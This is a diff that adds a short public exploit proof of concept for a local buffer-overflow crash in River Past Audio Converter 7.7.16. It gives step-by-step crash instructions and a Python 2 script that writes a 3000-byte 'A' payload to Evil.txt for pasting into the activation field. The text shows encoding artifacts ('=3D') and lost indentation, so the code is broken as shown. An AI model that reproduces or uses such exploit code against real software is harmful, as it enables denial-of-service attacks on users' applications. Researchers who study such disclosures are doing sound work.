@@ -1,0 +1,28 @@
+# Exploit Title: River_Past_Audio_Converter(DoS)
+# Date: 05.02.2019
+# Vendor Homepage:www.riverpast.com
+# Software Link :https://en.softonic.com/download/river-past-audio-converter/windows/post-download?sl=3D1
+# Exploit Author: Achilles
+# Tested Version: 7.7.16
+# Tested on: Windows XP SP3
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+# Steps to Produce the Crash:=20
+# 1.- Run python code : River_Past_Audio_Converter.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open River_PastAudio_Converter.exe
+# 4.- Paste the content of EVIL.txt into the field: 'E-Mail and Activation Code'
+# 5.- Click 'Activate' and you will see a crash.
+
+
+#!/usr/bin/env python
+
+buffer =3D "\x41" * 3000
+
+try:
+f=open("Evil.txt","w")
+print "[+] Creating %s bytes evil payload.." %len(buffer)
+f.write(buffer)
+f.close()
+print "[+] File created!"
+except:
+print "File cannot be created"
